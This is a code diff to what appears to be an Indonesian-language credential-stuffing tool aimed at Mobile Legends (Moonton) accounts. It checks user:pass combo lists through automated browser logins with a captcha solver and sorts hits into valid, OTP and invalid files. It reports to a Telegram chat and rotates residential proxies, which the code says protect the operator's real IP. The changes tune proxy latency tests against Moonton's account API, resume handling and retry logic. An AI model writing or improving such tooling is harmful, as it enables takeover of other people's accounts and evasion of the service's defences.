@@ -661,12 +661,12 @@ async def send_tg(text: str):
         payload = json.dumps({'chat_id': TG_CHAT, 'text': text, 'parse_mode': 'HTML'}).encode('utf-8')
         req = urllib.request.Request(url, data=payload, headers={'Content-Type': 'application/json'})
         loop = asyncio.get_running_loop()
-        await loop.run_in_executor(None, urllib.request.urlopen, req)
+        await loop.run_in_executor(None, lambda: urllib.request.urlopen(req, timeout=8))
     except Exception:
         pass
 
 def load_done() -> set[str]:
-    """Resume: kumpulkan akun yang sudah selesai dari output files."""
+    """Resume: kumpulkan pasangan user:pass yang sudah selesai dari output files."""
     done = set()
     for fn in (FILES['VALID'], FILES['OTP'], FILES['INVALID']):
         fp = os.path.join(OUTPUT_DIR, fn)
@@ -676,9 +676,9 @@ def load_done() -> set[str]:
                     for line in f:
                         line = line.strip()
                         if line and not line.startswith('#'):
-                            u = line.split(':')[0].split('|')[0].strip()
-                            if u:
-                                done.add(u.lower())
+                            up = line.split('|', 1)[0].strip()
+                            if up:
+                                done.add(up.lower())
             except Exception:
                 pass
     return done
@@ -1043,19 +1043,17 @@ def load_proxies(path: str) -> list[str]:
                 out.append(ln)
     return out
 
-async def test_proxy(proxy: dict, browser=None) -> tuple[bool, str]:
-    """FIX: Ganti browser-based test → raw urllib HTTP request.
-    Hemat bandwidth: tidak buka browser context, tidak load halaman, tidak ada CDN.
-    browser parameter dipertahankan untuk kompatibilitas signature lama (diabaikan).
-    """
+PROXY_API_PROBE_TIMEOUT = 5
+MAX_PROXY_PING_MS = 3500
+
+async def _probe_proxy_ms(proxy: dict) -> tuple[bool, str, int]:
+    """Uji konektivitas & RTT latency (ms) proxy langsung ke API Moonton."""
     try:
         server = proxy.get('server', '')
         username = proxy.get('username', '')
         password = proxy.get('password', '')
 
-        # Bangun proxy URL dengan kredensial jika ada
         if username:
-            # Encode kredensial yang mengandung karakter khusus
             enc_user = urllib.parse.quote(username, safe='')
             enc_pass = urllib.parse.quote(password, safe='') if password else ''
             if '://' in server:
@@ -1069,89 +1067,121 @@ async def test_proxy(proxy: dict, browser=None) -> tuple[bool, str]:
         loop = asyncio.get_running_loop()
 
         def _do_check():
+            t0 = time.perf_counter()
             if proxy_url.lower().startswith('socks'):
-                # ponytail: stdlib urllib rejects socks4/5; use curl_cffi (or TCP connect fallback)
                 try:
                     from curl_cffi import requests as _creq
-                    r = _creq.get(
-                        'http://cp.cloudflare.com/generate_204',
+                    r = _creq.head(
+                        'https://accountmtapi.mobilelegends.com/',
                         proxies={'http': proxy_url, 'https': proxy_url},
-                        timeout=PROXY_TEST_TIMEOUT,
+                        timeout=PROXY_API_PROBE_TIMEOUT,
                     )
-                    return r.status_code
+                    return r.status_code, int((time.perf_counter() - t0) * 1000)
                 except ImportError:
                     import socket
                     hp = proxy_url.split('://', 1)[1].rsplit('@', 1)[-1].split(':')
-                    with socket.create_connection((hp[0], int(hp[1])), timeout=PROXY_TEST_TIMEOUT):
-                        return 200
-            handler = urllib.request.ProxyHandler({
-                'http':  proxy_url,
-                'https': proxy_url,
-            })
+                    with socket.create_connection((hp[0], int(hp[1])), timeout=PROXY_API_PROBE_TIMEOUT):
+                        return 200, int((time.perf_counter() - t0) * 1000)
+            handler = urllib.request.ProxyHandler({'http': proxy_url, 'https': proxy_url})
             opener = urllib.request.build_opener(handler)
             opener.addheaders = [('User-Agent', 'Mozilla/5.0')]
-            # Target ringan: hanya butuh koneksi berhasil, tidak perlu body besar
-            resp = opener.open('http://cp.cloudflare.com/generate_204', timeout=PROXY_TEST_TIMEOUT)
-            return resp.status if hasattr(resp, 'status') else 200
+            req = urllib.request.Request('https://accountmtapi.mobilelegends.com/', method='HEAD')
+            try:
+                resp = opener.open(req, timeout=PROXY_API_PROBE_TIMEOUT)
+                code = resp.status if hasattr(resp, 'status') else 200
+            except urllib.error.HTTPError as he:
+                code = he.code
+                if code == 407:
+                    raise RuntimeError("407 TRAFFIC_EXHAUSTED")
+            return code, int((time.perf_counter() - t0) * 1000)
 
-        status = await asyncio.wait_for(
+        code, ms = await asyncio.wait_for(
             loop.run_in_executor(None, _do_check),
-            timeout=PROXY_TEST_TIMEOUT + 2
+            timeout=PROXY_API_PROBE_TIMEOUT + 1.5,
         )
-        return True, "OK"
-
+        if code == 407:
+            return False, "407 TRAFFIC_EXHAUSTED (Kuota habis)", ms
+        return True, f"OK ({ms}ms)", ms
     except asyncio.TimeoutError:
-        return False, "Timeout"
+        return False, "Timeout", 99999
     except Exception as e:
         msg = str(e)
-        if any(k in msg for k in ('407', 'TRAFFIC_EXHAUSTED', 'Unauthorized')):
-            return False, "407 TRAFFIC_EXHAUSTED (Kuota DataImpulse habis)"
-        elif any(k in msg for k in ('tunnel', 'TUNNEL', 'Connection refused')):
-            return False, "Tunnel connection failed"
-        elif 'timed out' in msg.lower():
-            return False, "Timeout"
-        return False, msg[:45]
+        mlow = msg.lower()
+        if any(k in mlow for k in ('407', 'traffic_exhausted', 'unauthorized')):
+            return False, "407 TRAFFIC_EXHAUSTED (Kuota DataImpulse habis)", 99999
+        elif any(k in mlow for k in ('tunnel', 'connection refused', 'connection reset')):
+            return False, "Tunnel connection failed", 99999
+        elif 'timed out' in mlow or 'timeout' in mlow:
+            return False, "Timeout", 99999
+        return False, msg[:45], 99999
 
-async def test_proxies(raw_proxies, browser=None, concurrency=20):
-    """ponytail: deduplicate by (server, base_token) so 110 DataImpulse country lines test in ~1s."""
+async def test_proxy(proxy: dict, browser=None) -> tuple[bool, str]:
+    ok, reason, _ = await _probe_proxy_ms(proxy)
+    return ok, reason
+
+async def test_proxies(raw_proxies, browser=None, concurrency=16):
+    """Uji ping proxy langsung ke API Moonton, buang yang mati/latency abnormal, dan urutkan tercepat."""
     parsed = [(r, parse_proxy(r)) for r in raw_proxies]
-    gateways = {}
-    for raw, p in parsed:
-        if not p:
-            continue
-        base_tok = (p.get("username") or "").split("__")[0]
-        gw_key = (p.get("server", ""), base_tok)
-        gateways.setdefault(gw_key, []).append(p)
-
-    sem = asyncio.Semaphore(concurrency)
-    gw_results = {}
-
-    async def probe_gw(gw_key, samples):
-        async with sem:
-            # Prefer reliable Tier-1/SEA samples first; try up to 3 samples before marking gateway dead
-            ordered = sorted(samples, key=lambda sp: 0 if any(f"__cr.{r}" in (sp.get("username") or "") for r in ("sg", "id", "us", "jp", "my")) else 1)
-            res = (False, "Probe failed")
-            for sp in ordered[:3]:
-                res = await test_proxy(sp)
-                if res[0]:
-                    break
-            gw_results[gw_key] = res
-
-    await asyncio.gather(*(probe_gw(k, sps) for k, sps in gateways.items()), return_exceptions=True)
-
-    good = []
+    valid_entries = [(idx, raw, p) for idx, (raw, p) in enumerate(parsed, 1) if p]
     for idx, (raw, p) in enumerate(parsed, 1):
         if not p:
-            p_out(f" {c(RED)}[BAD ]{W} [{idx:>3}/{len(parsed)}] {raw} → invalid format")
-            continue
-        base_tok = (p.get("username") or "").split("__")[0]
-        ok, reason = gw_results.get((p.get("server", ""), base_tok), (False, "Probe failed"))
-        if ok:
-            good.append((raw, p))
+            p_out(f" {c(RED)}[BAD ]{W} [{idx:>3}/{len(parsed)}] {raw} -> invalid format")
+    if not valid_entries:
+        return []
+
+    sem = asyncio.Semaphore(concurrency)
+    probe_targets = valid_entries[:250]
+
+    async def _run_probe(idx, raw, p):
+        async with sem:
+            ok, reason, ms = await _probe_proxy_ms(p)
+            return idx, raw, p, ok, reason, ms
+
+    results = await asyncio.gather(*(_run_probe(i, r, p) for i, r, p in probe_targets))
+
+    live = []
+    for idx, raw, p, ok, reason, ms in results:
+        if ok and ms <= MAX_PROXY_PING_MS:
+            live.append((ms, idx, raw, p))
         else:
-            p_out(f" {c(RED)}[FAIL]{W} [{idx:>3}/{len(parsed)}] {safe_proxy_str(p)} → {c(GOLD)}{reason}{W}")
-    if good:
-        p_out(f" {c(GREEN)}[ OK ]{W} Verified {len(good)}/{len(parsed)} proxies via {len(gateways)} gateway probe(s)")
+            why = f"Slow {ms}ms > {MAX_PROXY_PING_MS}ms" if ok else reason
+            p_out(f" {c(RED)}[DROP]{W} [{idx:>3}/{len(parsed)}] {safe_proxy_str(p)} -> {c(GOLD)}{why}{W}")
+
+    if not live:
+        return []
+
+    live.sort(key=lambda x: x[0])
+    lat_sorted = [x[0] for x in live]
+    median_ms = lat_sorted[len(lat_sorted) // 2]
+    cutoff_ms = min(MAX_PROXY_PING_MS, max(1500, int(median_ms * 1.6)))
+
+    fast = [x for x in live if x[0] <= cutoff_ms]
+    if len(fast) < min(10, len(live)):
+        fast = live[:min(10, len(live))]
+    else:
+        for ms, idx, raw, p in live[len(fast):]:
+            p_out(f" {c(GOLD)}[SLOW]{W} [{idx:>3}/{len(parsed)}] {safe_proxy_str(p)} -> {ms}ms > {cutoff_ms}ms (dibuang)")
+
+    # Perbarui DATAIMPULSE_REGIONS hanya dengan max 12 negara tercepat hasil ping ke API Moonton
+    fast_ccs = []
+    for ms, _, _, p in fast:
+        usr = p.get('username') or ''
+        if '__cr.' in usr:
+            for seg in usr.split('__'):
+                if seg.startswith('cr.'):
+                    cc = seg[3:].split(',')[0].strip().lower()
+                    if cc and cc not in _TUNNEL_BLACKLIST and cc not in fast_ccs:
+                        fast_ccs.append(cc)
+        if len(fast_ccs) >= 12:
+            break
+    if len(fast_ccs) >= 2:
+        DATAIMPULSE_REGIONS[:] = fast_ccs
+
+    good = [(raw, p) for _, _, raw, p in fast]
+    p_out(
+        f" {c(GREEN)}[ OK ]{W} {len(good)}/{len(probe_targets)} proxy lolos filter ping API "
+        f"(best: {fast[0][0]}ms, median: {median_ms}ms, cutoff: {cutoff_ms}ms)"
+    )
     return good
 
 # ── Aliyun Captcha Slider Solver (CDP Touch - proxy.py 1:1) ─────────────────
@@ -1577,10 +1607,16 @@ async def do_login_via_browser(page, ctx, user: str, passw: str, wid: int = 0, w
                 if not api_result["json"] and not api_result["had_waf"]:
                     if vue_submitted:
                         await page.evaluate(_vue_js, [user, passw])
+                    else:
+                        btn = await page.query_selector('.content-but')
+                        if btn:
+                            await btn.click()
                     try:
                         await asyncio.wait_for(resp_event.wait(), timeout=10.0)
                     except asyncio.TimeoutError:
                         pass
+                if api_result["proxy_err"] and not api_result["had_waf"] and not api_result["json"]:
+                    return 'ERR', {'message': 'PROXY_HTTP_ERR'}
                 if api_result["json"]:
                     break
 
@@ -1863,7 +1899,7 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                 try:
                     loop = asyncio.get_running_loop()
                     info_res = await asyncio.wait_for(
-                        loop.run_in_executor(None, get_player_info, guid_int, sess, dm),
+                        loop.run_in_executor(None, get_player_info, guid_int, sess, dm, 5),
                         timeout=15.0,
                     )
                 except Exception as ie:
@@ -2197,7 +2233,7 @@ async def async_main():
     workers = 3
 
     if args.out:
-        OUTPUT_DIR = os.path.join(BASE, args.out.replace(' ', '_'))
+        OUTPUT_DIR = os.path.abspath(args.out) if os.path.isabs(args.out) else os.path.join(BASE, args.out)
 
     if args.no_prompt or (args.combo and args.workers > 0):
         combo_path = args.combo or os.path.join(BASE, 'combo.txt')
@@ -2269,7 +2305,7 @@ async def async_main():
             combo_path = os.path.join(BASE, combo_path)
     combos = load_combos(combo_path)
     done_accounts = load_done()
-    queue = [x for x in combos if x[0].lower() not in done_accounts]
+    queue = [x for x in combos if f"{x[0]}:{x[1]}".lower() not in done_accounts]
 
     _print_box("CONFIGURATION", [
         f" {c(WHITE)}Queue   :{W} {c(GREEN)}{len(queue):,} accounts{W} {c(GRAY)}(tot:{len(combos):,}, done:{len(done_accounts):,}){W}",
@@ -2350,9 +2386,8 @@ async def async_main():
                 p_out(f"\n  {c(RED)}{BD}[!] File proxy kosong atau tidak ditemukan: {PROXY_FILE}{W}")
                 p_out(f"  {c(GRAY)}Eksekusi dibatalkan otomatis untuk melindungi IP asli kamu.{W}\n")
                 return
-            p_out(f"{c(CYAN)}[*] Menguji {len(raw_p)} proxy...{W}")
-            # FIX: test_proxies tidak lagi butuh browser (raw HTTP test)
-            good_proxies = await test_proxies(raw_p, concurrency=10)
+            p_out(f"{c(CYAN)}[*] Menguji ping proxy ke API Moonton ({len(raw_p)} proxy)...{W}")
+            good_proxies = await test_proxies(raw_p, concurrency=16)
             if good_proxies:
                 p_out(f"{c(GREEN)}[*] {len(good_proxies)} proxy berfungsi ✓{W}")
                 live_pool = [p[1] for p in good_proxies]
@@ -2389,7 +2424,7 @@ async def async_main():
             while not combo_q.empty():
                 started_at = time.time()
                 try:
-                    cur_b = await ensure_browser(force_relaunch=(fail_count >= 2))
+                    cur_b = await ensure_browser(force_relaunch=(fail_count >= 6))
                     await run_worker(
                         wid, queue, combo_q, cur_b, dm, p_info, live_pool,
                         ensure_browser=ensure_browser, browser_state=browser_state,
